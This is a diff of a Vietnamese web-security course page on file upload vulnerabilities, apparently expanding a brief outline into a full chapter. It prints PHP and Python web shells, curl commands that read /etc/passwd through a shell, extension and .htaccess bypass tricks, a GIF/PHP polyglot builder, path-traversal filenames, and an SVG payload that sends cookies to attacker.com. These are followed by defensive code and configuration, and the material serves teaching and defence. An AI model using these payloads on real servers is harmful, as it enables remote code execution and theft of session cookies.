@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 17: File Upload — Hieu Nguyen</title>
-  <meta name="description" content="Upload: type, size, storage, không execute, virus scan.">
+  <title>Chương 17: File Upload Vulnerabilities — Hieu Nguyen</title>
+  <meta name="description" content="Chương 17: File Upload Vulnerabilities — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,59 +40,415 @@
         <span>›</span>
         <span>17. File Upload</span>
       </div>
-      <h1>Chương 17: File Upload</h1>
-      <p class="lede">Upload không phải “lưu file”. Đó là parser, thumbnail, và chỗ execute nếu nhầm path.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> V — Server-side</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>Rủi ro: extension kép, MIME do client, file polyglot, path traversal tên file, store trên origin executable (PHP trong webroot), XXE/image magick.</p>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>Allowlist MIME + magic bytes server-side.</li>
-        <li>Tên file random; không dùng tên user làm path.</li>
-        <li>Store object storage, không webroot.</li>
-        <li>Serve với Content-Disposition attachment + nosniff.</li>
-        <li>Giới hạn size; quét malware trên async worker.</li>
-        <li>Resize ảnh bằng lib an toàn, patch ImageMagick.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Bucket private + signed URL. CDN không execute. Pod upload không quyền write trừ volume dedicated.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Đừng tin extension client.</li>
-        <li>Object storage.</li>
-        <li>Không execute upload.</li>
-        <li>Signed URL.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Content-Type từ browser đủ không?</li>
-        <li>Vì sao cấm lưu dưới /static user?</li>
-        <li>Polyglot là gì?</li>
-        <li>nosniff giúp gì?</li>
-        <li>Lambda/worker scan virus đặt đâu?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 17: File Upload Vulnerabilities</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>File Upload Vulnerabilities</strong> là nhóm lỗ hổng xảy ra khi ứng dụng cho phép upload file mà không validate đầy đủ về tên, loại, nội dung, hoặc kích thước. Hậu quả có thể là remote code execution, XSS, hoặc server compromise.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Rất cao — Upload web shell = full server control.</p>
+<hr>
+<h2 id="cách-hoạt-động">Cách hoạt động</h2>
+<pre><code class="language-python"># Vulnerable code
+@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])
+def upload():
+    file = request.files[&#x27;avatar&#x27;]
+    filename = file.filename  # Lấy nguyên tên từ user
+    file.save(f&quot;/var/www/html/uploads/{filename}&quot;)  # Lưu vào webroot!
+    return {&quot;url&quot;: f&quot;/uploads/{filename}&quot;}
 
-      <div class="docs-tags">
-        <span class="docs-tag">upload</span>
-        <span class="docs-tag">content-type</span>
-      </div>
+# Normal: avatar.jpg → /var/www/html/uploads/avatar.jpg
+# Attack: shell.php → /var/www/html/uploads/shell.php
+#         Request GET /uploads/shell.php → PHP executes → RCE!
+</code></pre>
+<hr>
+<h2 id="web-shell-upload">Web Shell Upload</h2>
+<p><strong>Web shell</strong> là script server-side cho phép thực thi commands qua HTTP.</p>
+<h3 id="php-web-shell">PHP Web Shell</h3>
+<pre><code class="language-php">&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;
+&lt;?php echo shell_exec($_REQUEST[&#x27;c&#x27;]); ?&gt;
+&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;
+&lt;?php eval($_POST[&#x27;code&#x27;]); ?&gt;
+
+// One-liner:
+&lt;?=`$_GET[0]`?&gt;
+</code></pre>
+<p><strong>Sử dụng:</strong></p>
+<pre><code class="language-bash">curl &quot;https://example.com/uploads/shell.php?cmd=id&quot;
+# → uid=33(www-data) gid=33(www-data)
+
+curl &quot;https://example.com/uploads/shell.php?cmd=cat+/etc/passwd&quot;
+curl &quot;https://example.com/uploads/shell.php?cmd=ls+-la+/&quot;
+</code></pre>
+<h3 id="pythonperlruby-web-shell-nếu-server-support">Python/Perl/Ruby Web Shell (nếu server support)</h3>
+<pre><code class="language-python"># shell.py (nếu server chạy Python scripts)
+import os, cgi
+form = cgi.FieldStorage()
+cmd = form.getvalue(&#x27;cmd&#x27;, &#x27;id&#x27;)
+print(&quot;Content-type: text/html\n\n&quot;)
+print(os.popen(cmd).read())
+</code></pre>
+<hr>
+<h2 id="bypass-validation-techniques">Bypass Validation Techniques</h2>
+<h3 id="1-bypass-content-type-check">1. Bypass Content-Type Check</h3>
+<p>Server check <code>Content-Type</code> header trong multipart upload:</p>
+<pre><code class="language-http">POST /upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=----boundary
+
+------boundary
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
+Content-Type: image/jpeg    ← Thay đổi Content-Type sang image/jpeg
+
+&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;
+------boundary--
+</code></pre>
+<p>Server check <code>Content-Type: image/jpeg</code> → pass! Nhưng lưu nội dung PHP vào file .php.</p>
+<h3 id="2-bypass-extension-blacklist">2. Bypass Extension Blacklist</h3>
+<pre><code class="language-text"># Nếu server block .php:
+shell.php3       # PHP3
+shell.php4       # PHP4
+shell.php5       # PHP5
+shell.phtml      # PHP HTML template
+shell.pHp        # Case variation
+shell.PHP        # Uppercase
+shell.php.jpg    # Null byte trước: shell.php%00.jpg (PHP 5.3.4 trở về)
+shell.php.       # Trailing dot (Windows)
+shell.php::$DATA # Windows ADS (Alternate Data Stream)
+shell.phar       # PHP Archive
+
+# Apache: nếu không set handler cho .xxx → fallback
+shell.php.xxx
+shell.php.unknown
+</code></pre>
+<h3 id="3-bypass-extension-whitelist">3. Bypass Extension Whitelist</h3>
+<p>Nếu server chỉ accept <code>.jpg</code>, <code>.png</code>, <code>.gif</code>:</p>
+<pre><code class="language-text"># Nếu server dựa vào extension để serve
+shell.jpg với content PHP
+→ Upload thành công vì extension .jpg
+→ Nhưng làm sao chạy PHP trong .jpg?
+
+# Apache misconfiguration:
+# Nếu có .htaccess upload:
+AddType application/x-httpd-php .jpg
+# → Tất cả .jpg được xử lý như PHP!
+
+# Or: upload .htaccess file
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;
+AddType application/x-httpd-php .jpg
+
+# Sau đó upload shell.jpg → executes as PHP
+</code></pre>
+<h3 id="4-upload-htaccess">4. Upload .htaccess</h3>
+<pre><code class="language-text"># .htaccess trong upload directory
+AddType application/x-httpd-php .jpg
+Options +ExecCGI
+AddHandler cgi-script .jpg
+</code></pre>
+<p><strong>Phòng chống:</strong> Server không nên đọc .htaccess trong upload directories.</p>
+<h3 id="5-polyglot-files">5. Polyglot Files</h3>
+<p>File hợp lệ ở nhiều formats cùng lúc:</p>
+<pre><code class="language-python"># Tạo file vừa là valid JPEG vừa là valid PHP
+import struct
+
+# JPEG magic bytes
+jpeg_header = b&#x27;\xff\xd8\xff\xe0&#x27;
+
+# PHP payload bên trong JPEG metadata
+php_payload = b&#x27;&#x27;&#x27;
+&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;
+&#x27;&#x27;&#x27;
+
+# GIF + PHP polyglot
+polyglot = b&#x27;GIF89a&#x27; + php_payload  # Valid GIF header + PHP code
+
+with open(&#x27;polyglot.php.gif&#x27;, &#x27;wb&#x27;) as f:
+    f.write(polyglot)
+
+# Nếu server check: &quot;Có phải GIF không?&quot; → GIF89a header → pass!
+# Nếu server serve với .php extension → PHP executes!
+</code></pre>
+<p><strong>Tool: exiftool để embed trong metadata:</strong></p>
+<pre><code class="language-bash">exiftool -Comment=&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; image.jpg
+# → PHP trong EXIF comment của file JPEG
+# Nếu server dùng GD/Imagick và preserve EXIF → payload survive image resizing
+</code></pre>
+<h3 id="6-path-traversal-trong-filename">6. Path Traversal trong Filename</h3>
+<pre><code class="language-text">filename = &quot;../../../var/www/html/shell.php&quot;
+→ File được lưu ra khỏi upload directory
+
+# URL encoded
+filename = &quot;..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php&quot;
+
+# Double encoded
+filename = &quot;..%252F..%252Fvar%252Fwww%252Fhtml%252Fshell.php&quot;
+</code></pre>
+<h3 id="7-race-condition">7. Race Condition</h3>
+<pre><code class="language-text">1. Upload file.php (với web shell)
+2. Server validate → xóa nếu invalid
+3. Trong window nhỏ giữa upload và validate
+   → Kẻ tấn công request file.php
+   → PHP executes trước khi bị xóa
+</code></pre>
+<hr>
+<h2 id="kịch-bản-tấn-công-svg-upload-xss">Kịch bản tấn công: SVG Upload XSS</h2>
+<p>Dù server có restrict PHP, SVG files có thể trigger XSS:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;
+&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; 
+  &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
+&lt;svg version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        alert(document.cookie);
+        fetch(&#x27;https://attacker.com/steal?c=&#x27; + document.cookie);
+    &lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>Nếu server serve SVG với <code>Content-Type: image/svg+xml</code> → browser execute JS.</p>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ Upload các file types khác nhau:
+  - .php, .php5, .phtml, .phar
+  - .asp, .aspx (IIS)
+  - .jsp (Tomcat)
+  - .sh (bash)
+
+□ Thử bypass Content-Type: image/jpeg với PHP content
+□ Upload .htaccess
+□ Test extension variations: .pHp, .PHP, .php.jpg
+□ Check upload directory có executable không?
+□ Check nếu file có thể truy cập trực tiếp từ URL
+
+□ SVG: inject XSS payload
+□ DOCX/XLSX: XXE payload
+□ Filename path traversal
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<h3 id="1-validate-file-content-magic-bytes">1. Validate File Content (Magic Bytes)</h3>
+<pre><code class="language-python">import magic
+from PIL import Image
+import io
+
+def validate_image(file_content: bytes, allowed_types: list) -&gt; bool:
+    # Kiểm tra magic bytes (không phải extension ho ặc Content-Type)
+    detected_type = magic.from_buffer(file_content, mime=True)
+    
+    if detected_type not in allowed_types:
+        return False
+    
+    # Kiểm tra là ảnh thực sự (có thể parse được)
+    if detected_type in (&#x27;image/jpeg&#x27;, &#x27;image/png&#x27;, &#x27;image/gif&#x27;):
+        try:
+            img = Image.open(io.BytesIO(file_content))
+            img.verify()  # Verify integrity
+        except Exception:
+            return False
+    
+    return True
+
+ALLOWED_IMAGE_TYPES = [&#x27;image/jpeg&#x27;, &#x27;image/png&#x27;, &#x27;image/gif&#x27;, &#x27;image/webp&#x27;]
+
+@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])
+def upload():
+    file = request.files[&#x27;avatar&#x27;]
+    content = file.read()
+    
+    if not validate_image(content, ALLOWED_IMAGE_TYPES):
+        return {&quot;error&quot;: &quot;Invalid file type&quot;}, 400
+    
+    # Xử lý tiếp...
+</code></pre>
+<h3 id="2-rename-file--không-giữ-tên-gốc">2. Rename File — Không giữ tên gốc</h3>
+<pre><code class="language-python">import secrets
+import os
+from pathlib import Path
+
+def save_upload(file_content: bytes, original_filename: str) -&gt; str:
+    # Lấy extension từ whitelist, không từ user input
+    ext_map = {
+        &#x27;image/jpeg&#x27;: &#x27;.jpg&#x27;,
+        &#x27;image/png&#x27;: &#x27;.png&#x27;,
+        &#x27;image/gif&#x27;: &#x27;.gif&#x27;,
+    }
+    
+    detected_mime = magic.from_buffer(file_content, mime=True)
+    
+    if detected_mime not in ext_map:
+        raise ValueError(&quot;File type not allowed&quot;)
+    
+    # Tạo tên file random
+    safe_filename = secrets.token_hex(16) + ext_map[detected_mime]
+    
+    # Lưu NGOÀI webroot — không accessible trực tiếp qua HTTP
+    upload_dir = Path(&#x27;/var/uploads&#x27;)  # Không phải /var/www/html/uploads
+    file_path = upload_dir / safe_filename
+    
+    file_path.write_bytes(file_content)
+    return safe_filename
+</code></pre>
+<h3 id="3-lưu-ngoài-webroot-và-serve-qua-application">3. Lưu ngoài Webroot và Serve qua Application</h3>
+<pre><code class="language-python"># Serve file qua application layer, không trực tiếp
+@app.route(&#x27;/files/&lt;file_id&gt;&#x27;)
+@login_required
+def serve_file(file_id):
+    # Check ownership
+    file = db.get_file(file_id, owner_id=g.current_user.id)
+    if not file:
+        abort(404)
+    
+    file_path = Path(&#x27;/var/uploads&#x27;) / file.stored_name
+    
+    return send_file(
+        file_path,
+        mimetype=file.mime_type,
+        as_attachment=False,
+        download_name=file.original_name
+    )
+</code></pre>
+<h3 id="4-image-reprocessing">4. Image Reprocessing</h3>
+<pre><code class="language-python">from PIL import Image
+import io
+
+def reprocess_image(file_content: bytes) -&gt; bytes:
+    &quot;&quot;&quot;
+    Reprocess image để strip metadata và ensure clean file
+    - Loại bỏ EXIF/metadata (ngăn polyglot attacks)
+    - Resize/recompress (ngăn decompression bombs)
+    &quot;&quot;&quot;
+    img = Image.open(io.BytesIO(file_content))
+    
+    # Convert về RGB (đảm bảo consistent format)
+    if img.mode in (&#x27;RGBA&#x27;, &#x27;P&#x27;):
+        img = img.convert(&#x27;RGBA&#x27;)
+    else:
+        img = img.convert(&#x27;RGB&#x27;)
+    
+    # Limit size
+    max_size = (2048, 2048)
+    img.thumbnail(max_size, Image.LANCZOS)
+    
+    # Save lại — không preserve metadata
+    output = io.BytesIO()
+    img.save(output, format=&#x27;JPEG&#x27;, quality=85)
+    
+    return output.getvalue()
+</code></pre>
+<h3 id="5-nginx-config--không-execute-trong-upload-directory">5. Nginx Config — Không Execute trong Upload Directory</h3>
+<pre><code class="language-nginx">location /uploads/ {
+    # Không cho phép execute scripts
+    add_header X-Content-Type-Options nosniff;
+    
+    # Override Content-Type — force download
+    types { }
+    default_type application/octet-stream;
+    
+    # Hoặc: chặn execution
+    location ~* \.(php|phtml|php3|php4|php5|pl|py|rb|sh)$ {
+        return 403;
+    }
+    
+    # Không đọc .htaccess
+    disable_symlinks on;
+}
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Lưu file trên Object Storage (S3) thay vì local:</strong></p>
+<pre><code class="language-python">import boto3
+
+s3 = boto3.client(&#x27;s3&#x27;)
+
+def upload_to_s3(file_content: bytes, original_name: str) -&gt; str:
+    # Random key name
+    s3_key = f&quot;uploads/{secrets.token_hex(16)}.jpg&quot;
+    
+    s3.put_object(
+        Bucket=&#x27;my-uploads-bucket&#x27;,
+        Key=s3_key,
+        Body=file_content,
+        ContentType=&#x27;image/jpeg&#x27;,
+        # Server-side encryption
+        ServerSideEncryption=&#x27;AES256&#x27;,
+        # Không public accessible (default)
+    )
+    
+    return s3_key
+
+# Serve qua presigned URL (temporary, limited time)
+def get_presigned_url(s3_key: str) -&gt; str:
+    return s3.generate_presigned_url(
+        &#x27;get_object&#x27;,
+        Params={&#x27;Bucket&#x27;: &#x27;my-uploads-bucket&#x27;, &#x27;Key&#x27;: s3_key},
+        ExpiresIn=3600  # 1 giờ
+    )
+</code></pre>
+<p><strong>Kubernetes: Scan uploaded files:</strong></p>
+<pre><code class="language-yaml"># ClamAV sidecar để scan uploads
+containers:
+  - name: app
+    image: myapp
+  - name: clamav
+    image: clamav/clamav
+    volumeMounts:
+      - name: uploads
+        mountPath: /uploads
+</code></pre>
+<p><strong>Limit upload size:</strong></p>
+<pre><code class="language-nginx"># Nginx: limit file size
+client_max_body_size 10M;
+
+# Kubernetes Ingress
+nginx.ingress.kubernetes.io/proxy-body-size: &quot;10m&quot;
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>File upload vulnerabilities → web shell upload → RCE.</li>
+<li>Validate bằng magic bytes (file content), không phải extension hay Content-Type header.</li>
+<li>Rename files với random names — không giữ tên gốc.</li>
+<li>Lưu files ngoài webroot và serve qua application.</li>
+<li>Reprocess images để strip metadata và ensure clean content.</li>
+<li>S3 object storage + presigned URLs là pattern tốt nhất.</li>
+<li>Nginx config ngăn script execution trong upload directories.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Tại sao kiểm tra Content-Type header kh ông đủ để validate file upload?</li>
+<li>Polyglot file attack là gì? Tại sao image reprocessing giúp phòng chống?</li>
+<li>Tại sao lưu files trong webroot nguy hiểm hơn ngoài webroot?</li>
+<li>Race condition trong file upload vulnerability hoạt động như thế nào?</li>
+<li>Mô tả tại sao S3 + presigned URLs là pattern tốt cho file storage.</li>
+</ol>
       <div class="docs-pager">
-        <a href="../16/">Previous · 16. XXE</a>
+        <a href="../15/">Previous · 15. SSRF</a>
         <a href="../18/">Next · 18. Path Traversal</a>
       </div>
     </article>
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#cách-hoạt-động">Cách hoạt động</a>
+        <a href="#web-shell-upload">Web Shell Upload</a>
+        <a class="depth-3" href="#php-web-shell">PHP Web Shell</a>
+        <a class="depth-3" href="#pythonperlruby-web-shell-nếu-server-support">Python/Perl/Ruby Web Shell (nếu server support)</a>
+        <a href="#bypass-validation-techniques">Bypass Validation Techniques</a>
+        <a class="depth-3" href="#1-bypass-content-type-check">1. Bypass Content-Type Check</a>
+        <a class="depth-3" href="#2-bypass-extension-blacklist">2. Bypass Extension Blacklist</a>
+        <a class="depth-3" href="#3-bypass-extension-whitelist">3. Bypass Extension Whitelist</a>
+        <a class="depth-3" href="#4-upload-htaccess">4. Upload .htaccess</a>
+        <a class="depth-3" href="#5-polyglot-files">5. Polyglot Files</a>
+        <a class="depth-3" href="#6-path-traversal-trong-filename">6. Path Traversal trong Filename</a>
+        <a class="depth-3" href="#7-race-condition">7. Race Condition</a>
+        <a href="#kịch-bản-tấn-công-svg-upload-xss">Kịch bản tấn công: SVG Upload XSS</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a class="depth-3" href="#1-validate-file-content-magic-bytes">1. Validate File Content (Magic Bytes)</a>
+        <a class="depth-3" href="#2-rename-file--không-giữ-tên-gốc">2. Rename File — Không giữ tên gốc</a>
+        <a class="depth-3" href="#3-lưu-ngoài-webroot-và-serve-qua-application">3. Lưu ngoài Webroot và Serve qua Application</a>
+        <a class="depth-3" href="#4-image-reprocessing">4. Image Reprocessing</a>
+        <a class="depth-3" href="#5-nginx-config--không-execute-trong-upload-directory">5. Nginx Config — Không Execute trong Upload Directory</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
